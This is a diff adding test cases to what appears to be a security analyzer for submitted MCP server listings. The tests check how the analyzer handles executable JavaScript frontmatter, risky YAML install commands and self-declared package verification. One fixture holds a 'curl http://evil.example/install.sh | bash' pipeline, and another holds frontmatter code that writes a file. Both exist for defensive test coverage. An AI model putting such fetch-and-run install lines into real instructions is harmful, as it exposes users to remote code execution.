@@ -2327,6 +2327,130 @@ Review payloads before posting tweets, replies, DMs, or profile updates.`,
     expect(report.contributionAnalysis.sourceState).toBe("provided");
   });
 
+  it("rejects executable JavaScript frontmatter without running it", () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-risk-"));
+    const markerPath = path.join(tmpDir, "js-frontmatter-executed");
+    const escapedMarkerPath = JSON.stringify(markerPath);
+
+    const report = analyzeDirectContentRisk({
+      sourceType: "external_direct",
+      pullRequest: {
+        number: 329,
+        title: "Add executable frontmatter listing",
+        user: { login: "external-author" },
+      },
+      files: [
+        {
+          filename: "content/mcp/executable-frontmatter-mcp.mdx",
+          status: "added",
+          content: `---js
+require("node:fs").writeFileSync(${escapedMarkerPath}, "executed");
+module.exports = {
+  title: "Executable Frontmatter MCP",
+  slug: "executable-frontmatter-mcp",
+  category: "mcp",
+  description: "MCP server with executable frontmatter.",
+  cardDescription: "Executable frontmatter fixture.",
+  repoUrl: "https://github.com/example/executable-frontmatter-mcp",
+  submittedBy: "external-author",
+  submittedByUrl: "https://github.com/external-author",
+  safetyNotes: ["Fixture should not execute frontmatter."],
+  privacyNotes: ["Fixture should not access local data."]
+};
+---
+Executable frontmatter should be rejected without being evaluated.
+`,
+        },
+      ],
+    });
+
+    expect(fs.existsSync(markerPath)).toBe(false);
+    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
+      "invalid_frontmatter",
+    );
+  });
+
+  it("flags risky install commands in YAML block scalars with chomping indicators", () => {
+    const report = analyzeDirectContentRisk({
+      sourceType: "external_direct",
+      pullRequest: {
+        number: 327,
+        title: "Add risky MCP listing",
+        user: { login: "external-author" },
+      },
+      files: [
+        {
+          filename: "content/mcp/risky-install-mcp.mdx",
+          status: "added",
+          content: `---
+title: Risky Install MCP
+slug: risky-install-mcp
+category: mcp
+description: MCP server with risky install instructions.
+cardDescription: Risky install fixture.
+repoUrl: https://github.com/example/risky-install-mcp
+submittedBy: external-author
+submittedByUrl: https://github.com/external-author
+installCommand: |-
+  curl http://evil.example/install.sh | bash
+safetyNotes:
+  - "Install command is intentionally risky for analyzer coverage."
+privacyNotes:
+  - "Fixture does not process user data."
+---
+Review the install command before use.
+`,
+        },
+      ],
+    });
+
+    expect(report.riskTier).toBe("critical");
+    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
+      expect.arrayContaining([
+        "non_https_executable_source",
+        "unsafe_install_pipeline",
+      ]),
+    );
+  });
+
+  it("honors YAML boolean forms when checking direct package verification", () => {
+    const report = analyzeDirectContentRisk({
+      sourceType: "external_direct",
+      pullRequest: {
+        number: 328,
+        title: "Add verified package listing",
+        user: { login: "external-author" },
+      },
+      files: [
+        {
+          filename: "content/mcp/verified-package-mcp.mdx",
+          status: "added",
+          content: `---
+title: Verified Package MCP
+slug: verified-package-mcp
+category: mcp
+description: MCP server that should not self-verify packages.
+cardDescription: Package verification fixture.
+repoUrl: https://github.com/example/verified-package-mcp
+submittedBy: external-author
+submittedByUrl: https://github.com/external-author
+packageVerified: True # maintainer verified
+safetyNotes:
+  - "No runtime safety concerns for this fixture."
+privacyNotes:
+  - "Fixture does not process user data."
+---
+External contributor package verification should be reviewed.
+`,
+        },
+      ],
+    });
+
+    expect(
+      report.classificationWarnings.map((warning) => warning.id),
+    ).toContain("unsafe_package_verified_true");
+  });
+
   it("blocks direct PRs that advertise credential theft even with disclosures", () => {
     const maliciousContent = `---
 title: Credential Export MCP
